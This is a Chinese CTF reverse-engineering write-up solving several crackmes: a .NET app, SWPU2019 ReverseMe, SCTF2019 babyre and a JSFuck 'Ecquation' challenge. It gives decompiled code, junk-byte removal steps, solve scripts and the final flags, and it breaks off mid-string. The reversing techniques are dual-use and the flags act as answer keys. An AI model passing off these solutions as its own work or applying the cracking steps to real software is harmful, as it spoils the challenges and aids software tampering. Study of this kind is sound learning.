安装成功之后，会在安装目录下，生成一个.exe文件，我们再扫个壳，这边就能看出来是C#编写的.net程序了 （麻了，我还以为要逆向安装程序，给我ida给我看呆了） 点击decode之后变成了doge，哈哈哈 我们放到dnSpy中进行反编译 找到加密函数之后，text3就是flag 断点打在加密函数最后的text3处，F5运行到这边，flag就出来了 （我跟个憨憨一样用逆向算法算了半天还没算出来……） [SWPU2019]ReverseMe （od动调plus）首先是查壳： 因为是c++编写的，ida静态分析难度较大，所以选择od动调分析： 快过来熟悉一下od的操作！！！ 首先通过中文搜索引擎跳转到提示性语句： 可以确定的是call语句的下一条cmp指令，与0x20，也就是32，决定是否跳转，也就是0x20是长度 我们输入一个符合条件的数值，继续向下调试。我这边输入了32个1 可以看到，在执行lea语句后，esi被赋值成”SWPU_2019_CTF” 这边是与输入字符进行异或，ord(1) ^ ord(S) = ord(‘b’) 可以在循环之外下断点，然后F9快速跳到断点出，再往下看，下面则是把数据依次压入栈： 再往下看，遇到一个函数，我们进入一个函数 F7跟进，我们遇到了xor，从0xae58b8地址读取数据赋给ecx，进行异或 选中下面的框框，我们选择在数据窗口中跟随地址 就能看到是什么数据进行对比了 1string2 = [0x86,0x0C,0x3E,0xCA,0x98,0xD7,0xAE,0x19,0xE2,0x77,0x6B,0xA6,0x6A,0xA1,0x77,0xB0,0x69,0x91,0x37,0x05,0x7A,0xF9,0x7B,0x30,0x43,0x5A,0x4B,0x10,0x86,0x7D,0xD4,0x28] 跳出这个函数之后，接着往下看： 开始了第三次异或，和第二次一样，我们只需要找这个地址的数据就行了 继续跟随数据窗口，跳转如下，我们找到了需要最终对比的数据了： 1final = [0xB3,0x37,0x0F,0xF8,0xBC,0xBC,0xAE,0x5D,0xBA,0x5A,0x4D,0x86,0x44,0x97,0x62,0xD3,0x4F,0xBA,0x24,0x16,0x0B,0x9F,0x72,0x1A,0x65,0x68,0x6D,0x26,0xBA,0x6B,0xC8,0x67] 最终脚本如下 123456789101112# 正 final[i] = input[i]^string1[i%13]^string2[i]# 逆 input[i] = final[i]^string1[i%13]^string2[i]string1 = &quot;SWPU_2019_CTF&quot;string2 = [0x86,0x0C,0x3E,0xCA,0x98,0xD7,0xAE,0x19,0xE2,0x77,0x6B,0xA6,0x6A,0xA1,0x77,0xB0,0x69,0x91,0x37,0x05,0x7A,0xF9,0x7B,0x30,0x43,0x5A,0x4B,0x10,0x86,0x7D,0xD4,0x28]final = [0xB3,0x37,0x0F,0xF8,0xBC,0xBC,0xAE,0x5D,0xBA,0x5A,0x4D,0x86,0x44,0x97,0x62,0xD3,0x4F,0xBA,0x24,0x16,0x0B,0x9F,0x72,0x1A,0x65,0x68,0x6D,0x26,0xBA,0x6B,0xC8,0x67]flag = &quot;&quot;for i in range(32): flag += chr(final[i] ^ ord(string1[i%13]) ^ string2[i])print(flag) flag{Y0uaretheB3st!#@_VirtualCC} 参考： https://blog.nowcoder.net/n/aa8086cbf8c54e3b8dd49c52e2fcefe0?from=nowcoder_improve [SCTF2019]babyre (花指令+三维迷宫+暗藏base64+？？？)ida打开后一瞅，我就知道事情不简单 发现了海量的花指令 第一处： 修改之后 第二处，下面的jrcxz也需要nop掉(细节上出问题后面就得重修……) 第三处： 第四处： E13处，in指令第二个字节C7是mov指令，就需要去把第一个字节给nop掉了 第五处： 所以说，一共 是五处花指令？ 下面是转换main函数，快捷键P 这边的话，先d键，转换为数据，再c键，force转换为代码 （注意，需要把所有的花指令修完之后，再去转换main函数和C22函数，重复了n次，每次都再C22处JUMPOUT） 选中798到C21，按P键转换成函数，还原main函数 这边也类似，选中到c22，按住P键，就可以把刚刚的loc_C22声明成函数，之后就可以F5反汇编了 以下就是成功反汇编出的主函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107__int64 __fastcall main(int a1, char **a2, char **a3){ char v4; // [rsp+Fh] [rbp-151h] int v5; // [rsp+10h] [rbp-150h] int v6; // [rsp+14h] [rbp-14Ch] char *v7; // [rsp+18h] [rbp-148h] char v8[10]; // [rsp+26h] [rbp-13Ah] BYREF _QWORD input3[2]; // [rsp+30h] [rbp-130h] BYREF int v10; // [rsp+40h] [rbp-120h] __int64 input2[3]; // [rsp+50h] [rbp-110h] BYREF char v12; // [rsp+68h] [rbp-F8h] __int64 v13[3]; // [rsp+70h] [rbp-F0h] BYREF char v14; // [rsp+88h] [rbp-D8h] __int64 input1[6]; // [rsp+90h] [rbp-D0h] BYREF __int16 v16; // [rsp+C0h] [rbp-A0h] char v17[136]; // [rsp+D0h] [rbp-90h] BYREF unsigned __int64 v18; // [rsp+158h] [rbp-8h] v18 = __readfsqword(0x28u); v5 = 0; memset(input2, 0, sizeof(input2)); v12 = 0; memset(v13, 0, sizeof(v13)); v14 = 0; memset(input1, 0, sizeof(input1)); v16 = 0; strcpy( v17, &quot;**************.****.**s..*..******.****.***********..***..**..#*..***..***.********************.**..*******..**...*..*.*.**.*&quot;); input3[0] = 0LL; input3[1] = 0LL; v10 = 0; v7 = &amp;v17[22]; strcpy(v8, &quot;sctf_9102&quot;); puts((const char *)(unsigned int)&quot;plz tell me the shortest password1:&quot;); scanf(&quot;%s&quot;, input1); v6 = 1; while ( v6 ) { v4 = *((_BYTE *)input1 + v5); switch ( v4 ) { case 'w': v7 -= 5; break; case 's': v7 += 5; break; case 'd': ++v7; break; case 'a': --v7; break; case 'x': v7 += 25; break; case 'y': v7 -= 25; break; default: v6 = 0; break; } ++v5; if ( *v7 != 46 &amp;&amp; *v7 != 35 ) v6 = 0; if ( *v7 == 35 ) { puts(&quot;good!you find the right way!\\nBut there is another challenge!&quot;); break; } } if ( v6 ) { puts((const char *)(unsigned int)&quot;plz tell me the password2:&quot;); scanf(&quot;%s&quot;, input2); sub_C22(input2, v13); if ( (unsigned int)sub_F67(v13, v8) == 1 ) { puts(&quot;Congratulation!&quot;); puts((const char *)(unsigned int)&quot;Now,this is the last!&quot;); puts(&quot;plz tell me the password3:&quot;); scanf(&quot;%s&quot;, input3); if ( (unsigned int)sub_FFA(input3) == 1 ) { puts(&quot;Congratulation!Here is your flag!:&quot;); printf(&quot;sctf{%s-%s(%s)}&quot;, (const char *)input1, (const char *)input2, (const char *)input3); } else { printf(&quot;something srong...&quot;); } return 0LL; } else { printf(&quot;sorry,somthing wrong...&quot;); return 0LL; } } else { printf(&quot;sorry,is't not a right way...&quot;); return 0LL; }} 可以看出这是个迷宫题，而且看起来方向键很多，是三维迷宫，长度为125 = 5 * 5 * 5 123456789101112maze = '**************.****.**s..*..******.****.***********..***..**..#*..***..***.********************.**..*******..**...*..*.*.**.*'maze_3d = []for i in range(25): maze_3d.append(maze[5*i:5*(i+1)])for i in range(1,len(maze_3d)+1): for j in maze_3d[i]: print(j,end = ' ') print() if i%5 == 0: print() 得出： 1input1 = 'ddwwxssxaxwwaasasyywwdd' 第二个挑战，就是每输入四个字符，就将其转换成3个字符： 下面附上大佬的爆破代码： 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;unsigned int data[128] = { 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x3E, 0x7F, 0x7F, 0x7F, 0x3F, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x7F, 0x7F, 0x7F, 0x40, 0x7F, 0x7F, 0x7F, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F};int main(){ int shuju[3] = { 0x736374,0x665f39,0x313032 }; int i0, i1, i2, i3, i4, i5; for (i0 = 0; i0 &lt; 3; i0++) { for(i1=32;i1&lt;128;i1++) for (i2 = 32; i2 &lt; 128; i2++) for (i3 = 32; i3 &lt; 128; i3++) for (i4 = 32; i4 &lt; 128; i4++) { i5 = (((((data[i1] &lt;&lt; 6) | data[i2]) &lt;&lt; 6) | data[i3]) &lt;&lt; 6) | data[i4]; if (i5 == shuju[i0]) printf(&quot;第%d组：%c%c%c%c\\n&quot;, i0+1,i1, i2, i3, i4); } } return 0;} 每个都带进入算了一遍，得知： 1input2 = &quot;c2N0Zl85MTAy&quot; 麻了，每四位转换成3位，就是唯一不同的地方是，缺4补上@，就是base64加密啊…… 最后进入第三个challenge，参考的是这位大佬 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273__int64 __fastcall sub_FFA(char *a1){ int v2; // [rsp+18h] [rbp-158h] int i; // [rsp+18h] [rbp-158h] int v4; // [rsp+1Ch] [rbp-154h] unsigned int v5; // [rsp+24h] [rbp-14Ch] unsigned int v6; // [rsp+28h] [rbp-148h] unsigned int v7; // [rsp+2Ch] [rbp-144h] int v8[16]; // [rsp+30h] [rbp-140h] int v9[16]; // [rsp+70h] [rbp-100h] int v10[26]; // [rsp+B0h] [rbp-C0h] unsigned int v11; // [rsp+118h] [rbp-58h] unsigned int v12; // [rsp+11Ch] [rbp-54h] unsigned int v13; // [rsp+120h] [rbp-50h] unsigned int v14; // [rsp+124h] [rbp-4Ch] unsigned __int64 v15; // [rsp+168h] [rbp-8h] v15 = __readfsqword(0x28u); v8[0] = 190; v8[1] = 4; v8[2] = 6; v8[3] = 128; v8[4] = 197; v8[5] = 175; v8[6] = 118; v8[7] = 71; v8[8] = 159; v8[9] = 204; v8[10] = 64; v8[11] = 31; v8[12] = 216; v8[13] = 191; v8[14] = 146; v8[15] = 239; v5 = (a1[6] &lt;&lt; 8) | (a1[5] &lt;&lt; 16) | (a1[4] &lt;&lt; 24) | a1[7]; v6 = (a1[10] &lt;&lt; 8) | (a1[9] &lt;&lt; 16) | (a1[8] &lt;&lt; 24) | a1[11]; v7 = (a1[14] &lt;&lt; 8) | (a1[13] &lt;&lt; 16) | (a1[12] &lt;&lt; 24) | a1[15]; v4 = 0; v2 = 4; v10[0] = sub_78A((a1[2] &lt;&lt; 8) | (a1[1] &lt;&lt; 16) | (*a1 &lt;&lt; 24) | a1[3]); v10[1] = sub_78A(v5); v10[2] = sub_78A(v6); v10[3] = sub_78A(v7); do { v10[v2] = sub_143B(v10[v4], v10[v4 + 1], v10[v4 + 2], v10[v4 + 3]); ++v4; ++v2; } while ( v2 &lt;= 29 ); v9[0] = HIBYTE(v11); v9[1] = BYTE2(v11); v9[2] = BYTE1(v11); v9[3] = v11; v9[4] = HIBYTE(v12); v9[5] = BYTE2(v12); v9[6] = BYTE1(v12); v9[7] = v12; v9[8] = HIBYTE(v13); v9[9] = BYTE2(v13); v9[10] = BYTE1(v13); v9[11] = v13; v9[12] = HIBYTE(v14); v9[13] = BYTE2(v14); v9[14] = BYTE1(v14); v9[15] = v14; for ( i = 0; i &lt;= 15; ++i ) { if ( v9[i] != v8[i] ) return 0xFFFFFFFFLL; } return 1LL;} 跟进这个函数 因为v2 初始等于 4 , v4 初始等于 0 ，上面的代码就可以转换成： v10[n+4] = v10[n] ^ function(v10[a+1] ^ v10[a+2] ^ v10[a+3]) 根据交换律 ==&gt;v10[n] = v10[n+4] ^ function(v10[a+1] ^ v10[a+2] ^ v10[a+3]) 这样就可以通过后四位逆推前一位（心态已经崩了） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import libnumv3 = [214, 144, 233, 254, 204, 225, 61, 183, 22, 182, 20, 194, 40, 251, 44, 5, 43, 103, 154, 118, 42, 190, 4, 195, 170, 68, 19, 38, 73, 134, 6, 153, 156, 66, 80, 244, 145, 239, 152, 122, 51, 84, 11, 67, 237, 207, 172, 98, 228, 179, 28, 169, 201, 8, 232, 149, 128, 223, 148, 250, 117, 143, 63, 166, 71, 7, 167, 252, 243, 115, 23, 186, 131, 89, 60, 25, 230, 133, 79, 168, 104, 107, 129, 178, 113, 100, 218, 139, 248, 235, 15, 75, 112, 86, 157, 53, 30, 36, 14, 94, 99, 88, 209, 162, 37, 34, 124, 59, 1, 33, 120, 135, 212, 0, 70, 87, 159, 211, 39, 82, 76, 54, 2, 231, 160, 196, 200, 158, 234, 191, 138, 210, 64, 199, 56, 181, 163, 247, 242, 206, 249, 97, 21, 161, 224, 174, 93, 164, 155, 52, 26, 85, 173, 147, 50, 48, 245, 140, 177, 227, 29, 246, 226, 46, 130, 102, 202, 96, 192, 41, 35, 171, 13, 83, 78, 111, 213, 219, 55, 69, 222, 253, 142, 47, 3, 255, 106, 114, 109, 108, 91, 81, 141, 27, 175, 146, 187, 221, 188, 127, 17, 217, 92, 65, 31, 16, 90, 216, 10, 193, 49, 136, 165, 205, 123, 189, 45, 116, 208, 18, 184, 229, 180, 176, 137, 105, 151, 74, 12, 150, 119, 126, 101, 185, 241, 9, 197, 110, 198, 132, 24, 240, 125, 236, 58, 220, 77, 32, 121, 238, 95, 62, 215, 203, 57, 72, 198, 186, 177, 163, 80, 51, 170, 86, 151, 145, 125, 103, 220, 34, 112, 178, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]def HIBYTE(a): return a&gt;&gt;(8*3)def BYTE2(a): return (a&gt;&gt;(8*2))%256def BYTE1(a): return (a&gt;&gt;8)%256def LOBYTE(a): return a%256def rol(value, time): if (time == 0): return value a = (value &amp; (1 &lt;&lt; 31)) &gt;&gt; 31 value &lt;&lt;= 1 value &amp;= (1 &lt;&lt; 32) - 1 value += a return rol(value, time - 1)def ror(value, time): if (time == 0): return value a = (value &amp; (1)) &lt;&lt; 31 value &gt;&gt;= 1 value += a return ror(value, time - 1)def sub_55B683001464(a): v2 = (v3[BYTE2(a)]&lt;&lt;16)|v3[LOBYTE(a)]|(v3[BYTE1(a)]&lt;&lt;8)|(v3[HIBYTE(a)]&lt;&lt;24) return rol(v2,12)^rol(v2,8)^ror(v2,2)^ror(v2,6)def sub_55B68300143B(a, b, c, d): return a ^ sub_55B683001464(b ^ c ^ d)vx = [190,4,6,128,197,175,118,71,159,204,64,31,216,191,146,239]v8 = []for i in range(4): x = vx[i*4] x &lt;&lt;= 8 x += vx[i*4+1] x &lt;&lt;= 8 x += vx[i*4+2] x &lt;&lt;= 8 x += vx[i*4+3] print(hex(x)) v8.append(x)input = [0]*30input[26] = v8[0]input[27] = v8[1]input[28] = v8[2]input[29] = v8[3]for i in range(26): input[25-i] = input[25-i+4]^sub_55B683001464(input[25-i+3]^input[25-i+2]^input[25-i+1])flag = ''for i in range(4): x = libnum.n2s(input[i]).decode() x = list(x) x.reverse() x = ''.join(x) flag += xprint(flag) 运行结果： 所以最后的flag为： sctf{ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)} Ecquation (js fuck加密+z3)http://codertab.com/JsUnFuck 题目中提示这个是Js的fuck加密，可以在网站上一个一个的解密，当然也可以用脚本跑 在网上找了一份关于此的解密脚本 123456789101112&lt;script&gt;function deEquation(str) { for (let i = 0; i &lt;= 1; i++) { str = str.replace(/l\\[(\\D*?)](\\+l|-l|==)/g, (m, a, b) =&gt; 'l[' + eval(a) + ']' + b); } str = str.replace(/==(\\D*?)&amp;&amp;/g, (m, a) =&gt; '==' + eval(a) + '&amp;&amp;'); return str;}s=&quot;l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+[]]]+l[!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+[]]]+l[+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+[]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]]+l[+[]]==+(+!+[]+[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]])&amp;&amp;l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])&amp;&amp;l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+[]]-l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]